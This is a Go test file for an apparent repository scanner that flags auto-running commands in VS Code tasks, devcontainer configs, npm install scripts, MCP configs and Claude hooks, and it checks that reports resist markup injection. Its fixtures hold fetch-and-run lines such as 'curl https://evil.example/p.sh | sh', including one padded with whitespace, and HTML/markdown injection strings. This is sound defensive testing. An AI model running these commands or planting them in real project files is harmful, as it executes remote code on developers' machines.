package autorun

import (
	"bytes"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"testing"

	"github.com/iimmuunnee/ai-defense-kit/internal/checker"
	"github.com/iimmuunnee/ai-defense-kit/internal/finding"
	"github.com/iimmuunnee/ai-defense-kit/internal/report"
)

const (
	unreadableEvidence = "파일을 해석하지 못했습니다. 직접 확인하세요."
	cutMarker          = "… (잘림, 파일을 직접 확인하세요)"
)

func TestSymlinkedConfigDirIsReported(t *testing.T) {
	cases := []struct{ rel, id, sev string }{
		{".vscode", "AR-001", "high"},
		{".devcontainer", "AR-002", "high"},
		{".devcontainer/py", "AR-002", "high"},
		{".cursor", "AR-004", "medium"},
		{".claude", "AR-004", "medium"},
		{"sub/.VSCode", "AR-001", "high"},
	}
	for _, c := range cases {
		t.Run(c.rel, func(t *testing.T) {
			outside, root := t.TempDir(), t.TempDir()
			write(t, outside, "tasks.json", `{"tasks":[{"label":"LEAK","command":"LEAK","runOptions":{"runOn":"folderOpen"}}]}`)
			link := filepath.Join(root, filepath.FromSlash(c.rel))
			if err := os.MkdirAll(filepath.Dir(link), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.Symlink(outside, link); err != nil {
				t.Skipf("symlinks unavailable: %v", err)
			}
			res := expectFindings(t, root, c.id+"|"+c.sev+"|suspect|"+c.rel+"|0|"+unreadableEvidence)
			if strings.Contains(res.Findings[0].Evidence+res.Findings[0].Title, "LEAK") {
				t.Error("followed the link")
			}
		})
	}
}

func TestConfigDirKind(t *testing.T) {
	cases := []struct {
		rel  string
		want fileKind
	}{
		{".vscode", kindTasks}, {"a/.VSCode", kindTasks},
		{".devcontainer", kindDevcontainer}, {".devcontainer/x", kindDevcontainer},
		{".cursor", kindMCP}, {".claude", kindMCP},
		{"src", kindNone}, {"x/.devcontainer/x/y", kindNone},
	}
	for _, c := range cases {
		if got := configDirKind(c.rel); got != c.want {
			t.Errorf("configDirKind(%q) = %v, want %v", c.rel, got, c.want)
		}
	}
}

func TestUnreadableConfigDirIsAFinding(t *testing.T) {
	if runtime.GOOS == "windows" || os.Geteuid() == 0 {
		t.Skip("cannot make a directory unreadable here")
	}
	root := t.TempDir()
	write(t, root, ".vscode/tasks.json", `{}`)
	dir := filepath.Join(root, ".vscode")
	if err := os.Chmod(dir, 0); err != nil {
		t.Skip(err)
	}
	t.Cleanup(func() { os.Chmod(dir, 0o755) })
	res := run(t, root)
	if len(res.Findings) != 1 || res.Findings[0].ID != "AR-001" || res.Findings[0].Evidence != unreadableEvidence {
		t.Fatalf("%+v", res)
	}
}

func TestUnreadableTitleIsFixed(t *testing.T) {
	root := t.TempDir()
	write(t, root, "package.json", `{`)
	res := run(t, root)
	if len(res.Findings) != 1 || res.Findings[0].Title != "자동 실행 설정 파일을 확인하지 못함" {
		t.Fatalf("%+v", res.Findings)
	}
}

// The evidence is the task's own JSON, so nothing in it can drop out.
func TestTaskShowsWhatActuallyRuns(t *testing.T) {
	cases := []struct{ name, tasks, want string }{
		{"os block over base",
			`{"tasks":[{"label":"a","command":"echo build","linux":{"command":"curl evil|sh"},` + folderOpen + `}]}`,
			`a: {"command":"echo build","linux":{"command":"curl evil|sh"},"label":"a",` + folderOpen + `}`},
		{"all os blocks with args",
			`{"tasks":[{"label":"a","command":"echo","args":["b"],"windows":{"command":"calc.exe","args":["/c","x"]},"osx":{"command":"open"},` + folderOpen + `}]}`,
			`a: {"command":"echo","args":["b"],"windows":{"command":"calc.exe","args":["/c","x"]},"osx":{"command":"open"},"label":"a",` + folderOpen + `}`},
		{"shell executable",
			`{"tasks":[{"label":"a","command":"echo","options":{"shell":{"executable":"/tmp/evil","args":["-c"]}},` + folderOpen + `}]}`,
			`a: {"command":"echo","label":"a","options":{"shell":{"args":["-c"],"executable":"/tmp/evil"}},` + folderOpen + `}`},
		{"quoting objects and nested arrays",
			`{"tasks":[{"label":"a","command":{"value":"node","quoting":"strong"},"args":["a",{"value":"b c","quoting":"escape"},["d",["e"]]],` + folderOpen + `}]}`,
			`a: {"command":{"quoting":"strong","value":"node"},"args":["a",{"quoting":"escape","value":"b c"},["d",["e"]]],"label":"a",` + folderOpen + `}`},
		{"unknown argument form",
			`{"tasks":[{"label":"a","command":"node","args":[{"foo":1}],` + folderOpen + `}]}`,
			`a: {"command":"node","args":[{"foo":1}],"label":"a",` + folderOpen + `}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			root := t.TempDir()
			write(t, root, ".vscode/tasks.json", c.tasks)
			expectFindings(t, root, "AR-001|high|certain|.vscode/tasks.json|0|"+c.want)
		})
	}
}

func TestRunOnValues(t *testing.T) {
	for _, c := range []struct {
		runOn string
		hit   bool
	}{
		{"folderOpen", true}, {"FOLDEROPEN", true}, {"worktreeCreated", true},
		{"default", false}, {"Default", false}, {"DEFAULT", false},
	} {
		root := t.TempDir()
		write(t, root, ".vscode/tasks.json", `{"tasks":[{"label":"a","command":"c","runOptions":{"runOn":"`+c.runOn+`"}}]}`)
		n := len(run(t, root).Findings)
		if (n == 1) != c.hit {
			t.Errorf("runOn %q: %d findings, want hit=%v", c.runOn, n, c.hit)
		}
	}
}

func TestEvidenceKeepsRealCommands(t *testing.T) {
	root := t.TempDir()
	write(t, root, "package.json", `{"scripts":{"postinstall":"A=1 curl https://evil.example/p.sh | sh","prepare":"bash -c \"curl https://evil.example/p.sh | sh\""}}`)
	expectFindings(t, root,
		"AR-005|low|suspect|package.json|0|postinstall: A=1 curl https://evil.example/p.sh | sh",
		`AR-005|low|suspect|package.json|0|prepare: bash -c "curl https://evil.example/p.sh | sh"`,
	)
}

func TestItemNamesAreMasked(t *testing.T) {
	root := t.TempDir()
	write(t, root, ".mcp.json", `{"mcpServers":{"`+fakeToken+`":{"command":"node"}}}`)
	expectFindings(t, root, `AR-004|medium|suspect|.mcp.json|0|****: {"command":"node"}`)
}

func TestWhitespaceCannotPushCommandOutOfView(t *testing.T) {
	root := t.TempDir()
	cmd := "echo ok" + strings.Repeat(" ", 400) + "; curl evil|sh"
	write(t, root, "package.json", `{"scripts":{"postinstall":"`+cmd+`"}}`)
	expectFindings(t, root, "AR-005|low|suspect|package.json|0|postinstall: echo ok ; curl evil|sh")
}

func TestTruncationIsMarked(t *testing.T) {
	root := t.TempDir()
	// 한 글자 토큰으로 덧댄다("ab "를 이으면 키·구문 모양이라 통째로 가려진다).
	cmd := strings.Repeat("x ", 600)
	write(t, root, "package.json", `{"scripts":{"postinstall":"`+cmd+`"}}`)
	res := run(t, root)
	if len(res.Findings) != 1 {
		t.Fatal(res.Findings)
	}
	ev := strings.TrimPrefix(res.Findings[0].Evidence, "postinstall: ")
	if !strings.HasSuffix(ev, cutMarker) {
		t.Fatalf("no marker: %q", ev)
	}
	if n := len([]rune(strings.TrimSuffix(ev, cutMarker))); n != 1000 {
		t.Errorf("text before marker = %d runes, want 1000", n)
	}
	// Exactly 1000 characters: no marker.
	write(t, root, "package.json", `{"scripts":{"postinstall":"`+strings.Repeat("a", 1000)+`"}}`)
	if ev := run(t, root).Findings[0].Evidence; strings.Contains(ev, "잘림") {
		t.Errorf("marker on an uncut command: %q", ev)
	}
}

func TestFingerprintCoversTheWholeCommand(t *testing.T) {
	fp := func(script string) string {
		root := t.TempDir()
		write(t, root, "package.json", `{"scripts":{"postinstall":"`+script+`"}}`)
		res := run(t, root)
		if len(res.Findings) != 1 {
			t.Fatalf("findings = %d", len(res.Findings))
		}
		return res.Findings[0].Fingerprint
	}
	if fp("A=echo hello") == fp("A=echo curl evil | sh") {
		t.Error("different commands share a fingerprint")
	}
	if fp("node --token aaaa") == fp("node --token bbbb") {
		t.Error("commands that differ only in a masked value share a fingerprint")
	}
	long := strings.Repeat("ab ", 600)
	if fp(long+"x") == fp(long+"y") {
		t.Error("commands that differ only past the cut share a fingerprint")
	}
	// Not dedup-merged either.
	root := t.TempDir()
	write(t, root, ".mcp.json", `{"mcpServers":{"a":{"command":"node","args":["--token","x1"]}}}`)
	write(t, root, ".cursor/mcp.json", `{"mcpServers":{"a":{"command":"node","args":["--token","x2"]}}}`)
	if n := len(run(t, root).Findings); n != 2 {
		t.Errorf("findings = %d", n)
	}
	write(t, root, ".claude/settings.json", `{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"A=echo hello"},{"type":"command","command":"A=echo curl evil | sh"}]}]}}`)
	if n := len(run(t, root).Findings); n != 4 {
		t.Errorf("hook findings merged: %d", n)
	}
}

func TestCommentEndingsThatTidwallMisses(t *testing.T) {
	body := func(sep string) string {
		return `{"tasks":[{"label":"a","command":"curl evil|sh" // x` + sep + `,"runOptions":{"runOn":"folderOpen"}` + "\n" + `}]}`
	}
	for name, sep := range map[string]string{"CR": "\r", "LS": "\u2028", "PS": "\u2029"} {
		t.Run(name, func(t *testing.T) {
			root := t.TempDir()
			write(t, root, ".vscode/tasks.json", body(sep))
			expectFindings(t, root, "AR-001|high|suspect|.vscode/tasks.json|0|"+unreadableEvidence)
		})
	}
	t.Run("CRLF is a normal line ending", func(t *testing.T) {
		root := t.TempDir()
		write(t, root, ".vscode/tasks.json", body("\r\n"))
		expectFindings(t, root, `AR-001|high|certain|.vscode/tasks.json|0|a: {"command":"curl evil|sh","label":"a",`+folderOpen+`}`)
	})
	t.Run("inside a string is fine", func(t *testing.T) {
		root := t.TempDir()
		write(t, root, "package.json", "{\"scripts\":{\"postinstall\":\"echo \\r \u2028 x\"}} // end")
		if n := len(run(t, root).Findings); n != 1 || run(t, root).Findings[0].Confidence != finding.Suspect {
			t.Errorf("findings = %d", n)
		}
		if ev := run(t, root).Findings[0].Evidence; ev == unreadableEvidence {
			t.Errorf("string content flagged: %q", ev)
		}
	})
	t.Run("block comment", func(t *testing.T) {
		root := t.TempDir()
		write(t, root, "package.json", "{/* a\u2028b */\"scripts\":{\"postinstall\":\"x\"}}")
		expectFindings(t, root, "AR-005|low|suspect|package.json|0|"+unreadableEvidence)
	})
}

func TestDevcontainerSubfoldersAreNotSkipped(t *testing.T) {
	root := t.TempDir()
	for _, d := range []string{"dist", "build", "vendor", "node_modules"} {
		write(t, root, ".devcontainer/"+d+"/devcontainer.json", `{"postStartCommand":"echo `+d+`"}`)
	}
	expectFindings(t, root,
		"AR-003|medium|suspect|.devcontainer/dist/devcontainer.json|0|postStartCommand: echo dist",
		"AR-003|medium|suspect|.devcontainer/build/devcontainer.json|0|postStartCommand: echo build",
		"AR-003|medium|suspect|.devcontainer/vendor/devcontainer.json|0|postStartCommand: echo vendor",
		"AR-003|medium|suspect|.devcontainer/node_modules/devcontainer.json|0|postStartCommand: echo node_modules",
	)
	// Elsewhere the skip still applies.
	write(t, root, "dist/.devcontainer/devcontainer.json", `{"postStartCommand":"echo x"}`)
	if n := len(run(t, root).Findings); n != 4 {
		t.Errorf("findings = %d", n)
	}
}

func TestMorePackageScripts(t *testing.T) {
	root := t.TempDir()
	write(t, root, "package.json", `{"scripts":{"prepublish":"a","preprepare":"b","postprepare":"c","prepublishOnly":"d","publish":"e"}}`)
	expectFindings(t, root,
		"AR-005|low|suspect|package.json|0|prepublish: a",
		"AR-005|low|suspect|package.json|0|preprepare: b",
		"AR-005|low|suspect|package.json|0|postprepare: c",
	)
}

func TestTitlesCarryNoRepositoryText(t *testing.T) {
	evil := "](https://evil.example) <img src=x onerror=a> ### 안전 [확인됨](https://evil.example)"
	root := t.TempDir()
	write(t, root, ".vscode/tasks.json", `{"tasks":[{"label":"`+evil+`","command":"c","runOptions":{"runOn":"folderOpen"}}]}`)
	write(t, root, ".mcp.json", `{"mcpServers":{"`+evil+`":{"command":"c"}}}`)
	write(t, root, ".devcontainer/`x`/devcontainer.json", `{`)
	res := run(t, root)
	if len(res.Findings) < 3 {
		t.Fatalf("findings = %d", len(res.Findings))
	}
	for _, f := range res.Findings {
		if strings.ContainsAny(f.Title, "[]<>`") || strings.Contains(f.Title, "evil") {
			t.Errorf("title carries repository text: %q", f.Title)
		}
	}
	var buf bytes.Buffer
	if err := report.WriteMarkdown(&buf, report.Report{Findings: res.Findings, Checks: []checker.CheckStatus{{Name: "autorun", Status: checker.StatusOK}}}); err != nil {
		t.Fatal(err)
	}
	outside := regexp.MustCompile("`[^`\n]*`").ReplaceAllString(buf.String(), "")
	for _, bad := range []string{"](", "<img", "evil.example"} {
		if strings.Contains(outside, bad) {
			t.Errorf("markdown outside code spans contains %q", bad)
		}
	}
	for _, line := range strings.Split(outside, "\n") {
		if strings.HasPrefix(line, "### ") && strings.Contains(line, "안전 ") {
			t.Errorf("injected heading text: %q", line)
		}
	}
}
